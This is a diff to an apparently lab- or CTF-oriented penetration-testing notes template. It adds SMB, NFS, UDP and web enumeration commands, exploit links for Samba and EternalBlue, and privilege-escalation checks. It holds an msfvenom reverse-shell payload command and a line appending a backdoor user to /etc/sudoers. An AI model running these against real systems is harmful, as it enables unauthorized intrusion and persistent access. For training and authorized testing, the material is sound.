@@ -16,6 +16,12 @@ INSERTTCPSCAN
 
 ## Recon
 
+### Guide
+
+[Enumeration Cheat Sheet](http://0daysecurity.com/penetration-testing/enumeration.html)
+
+[Black Winter Security Tools/Techniques](https://blackwintersecurity.com/tools/)
+
 
 ```
 Always start with a stealthy scan to avoid closing ports.
@@ -30,8 +36,8 @@ nmap INSERTIPADDRESS -p-
 nmap INSERTIPADDRESS -sV -sC -O -p 111,222,333
 
 # Scan for UDP
-nmap INSERTIPADDRESS -sU
-unicornscan -mU -v -I INSERTIPADDRESS
+nmap -n -v -sU -T4 -A INSERTIPADDRESS -oN udp_INSERTIPADDRESS.nmap
+nmap -n -v -sU --top-ports 200 -T4 INSERTIPADDRESS -oN udp_INSERTIPADDRESS_200.nmap
 
 # Connect to udp if one is open
 nc -u INSERTIPADDRESS 48772
@@ -75,7 +81,7 @@ INSERTSSHCONNECT
 nc INSERTIPADDRESS 22
 ```
 
-### Port 25
+### Port 25 - SMTP
 
 - Name:
 - Version:
@@ -102,6 +108,9 @@ nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve
 
 This is used for tftp-server.
 
+### Port 79 - Finger
+
+[User Enumeration with Finger](https://pentestlab.blog/tag/finger/)
 
 ### Port 110 - Pop3
 
@@ -134,9 +143,25 @@ retr 9
 ### Port 111 - Rpcbind
 
 ```
-rpcinfo -p INSERTIPADDRESS
+INSERTRPCBIND
 ```
 
+```
+rpcinfo -p INSERTIPADDRESS
+
+showmount -e INSERTIPADDRESS 
+
+mkdir /mnt/<DIR>
+mount -t nfs INSERTIPADDRESS:<Remote DIR> /mnt/<DIR>/
+```
+
+Information on NFS enumeration and exploiting NFS
+
+[NFS Enumeration and Exploiting Misconfiguration](https://medium.com/@joe_norton/exploiting-metasploitable-without-metasploit-nfs-enumeration-and-exploiting-misconfiguration-86504ccd15b9)
+
+[Vulnix Writeup](https://blog.christophetd.fr/write-up-vulnix/)
+
+Note: You may have to match your permissions to the permissions on the share. See Vulnix.
 
 ### Port 135 - MSRPC
 
@@ -156,7 +181,6 @@ Some versions are vulnerable.
 ```
 nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERTIPADDRESS -p 445
 
-
 enum4linux -a INSERTIPADDRESS
 rpcclient -U "" INSERTIPADDRESS
 	srvinfo
@@ -167,11 +191,36 @@ rpcclient -U "" INSERTIPADDRESS
 	netshareenumall
 
 smbclient -L INSERTIPADDRESS
+smbclient -L "\\\\INSERTIPADDRESS" -m SMB2
 smbclient //INSERTIPADDRESS/tmp
 smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
-smbclient //INSERTIPADDRESS/ipc$ -U john  
+smbclient //INSERTIPADDRESS/ipc$ -U john
+
+smbmap -H INSERTIPADDRESS
 ```
 
+##### Notes
+
+Exploit for Samba before 3.3.11, 3.4.x before 3.4.6, and 3.5.x before 3.5.0rc3, when a writable share exists:
+
+* [Samba 3.4.5 - Symlink Directory Traversal](https://www.exploit-db.com/exploits/33598)
+* [Samba Remote Directory Traversal](https://packetstormsecurity.com/files/85957/Samba-Remote-Directory-Traversal.html)
+* [CVE-2010-0926](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0926)
+* See HTB: Lame
+
+If Windows then check for Eternal Blue (MS17-010):
+
+* [MS17-010](https://github.com/worawit/MS17-010)
+* See HTB: Blue
+* See HTB: Legacy
+* Use non-staged payload for zzz_exploit
+  * msfvenom -p windows/shell_reverse_tcp LHOST= INSERTIPADDRESS LPORT=1906 -f exe-service -o eternal.exe
+
+```
+python checker.py INSERTIPADDRESS
+```
+
+[NetBIOS and SMB Penetration Testing on Windows](https://www.hackingarticles.in/netbios-and-smb-penetration-testing-on-windows/)
 
 ### Port 161/162 UDP - SNMP
 
@@ -187,7 +236,6 @@ private
 community
 ```
 
-
 ### Port 554 - RTSP
 
 
@@ -195,7 +243,7 @@ community
 
 Used by RPC to connect in domain network.
 
-## Port 1521 - Oracle
+### Port 1521 - Oracle
 
 - Name:
 - Version:
@@ -326,6 +374,9 @@ dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt
 
 # Gobuster - remove relevant responde codes (403 for example)
 gobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+
+# Dirsearch (multi-threaded)
+dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://INSERTIPADDRESS -t 20 -e html
 ```
 
 Dirb Scan:
@@ -360,9 +411,6 @@ username <servicename>
 
 
 #### LFI/RFI
-
-
-
 
 ```
 fimap -u "http://INSERTIPADDRESS/example.php?test="
@@ -436,20 +484,6 @@ searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"
 searchsploit -t Apache | grep -v '/dos/'
 ```
 
-
-
-----------------------------------------------------------------------------
-
-
-
-'''''''''''''''''''''''''''''''''' PRIVESC '''''''''''''''''''''''''''''''''
-
-
-
------------------------------------------------------------------------------
-
-
-
 ## Privilege escalation
 
 Now we start the whole enumeration-process over gain.
@@ -474,6 +508,21 @@ Less likely
 
 Here you will add all possible leads. What to try.
 
+* `sudo -l`
+* `which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`
+    * If you don’t see a compiler such as GCC, you know it’s probably not going to be a kernel exploit
+
+### Guides
+
+* [g0tmi1k Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+
+If Service account, and SEImpersonatePrivilege enabled, then run Rotten Potato/Juicy Potato.
+
+### Scripts
+
+* [LinEnum](https://github.com/rebootuser/LinEnum)
+* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+* [pspy](https://github.com/DominicBreuker/pspy)
 
 ### Useful commands
 
@@ -499,9 +548,12 @@ python linprivchecker.py extended
 /tmp
 /var/tmp
 
-
 # Add user to sudoers
 echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
+
+# Check for tools (If you don’t see a compiler such as GCC, you know it’s probably not going to be a kernel exploit)
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
+
 ```
 
 
@@ -691,22 +743,6 @@ cat /etc/ssh/ssh_host_key
 Require user interaction
 
 
-
-
-
-------------------------------------------------------------------------
-
-
-
-
------------------------------ LOOT LOOT LOOT LOOT ----------------------
-
-
-
-
-------------------------------------------------------------------------
-
-
 ## Loot
 
 **Checklist**
@@ -726,7 +762,7 @@ Require user interaction
 ### Proof
 
 ```
-/root/proof.txt
+hostname && whoami && cat proof.txt && /sbin/ifconfig
 ```
 
 ### Network secret
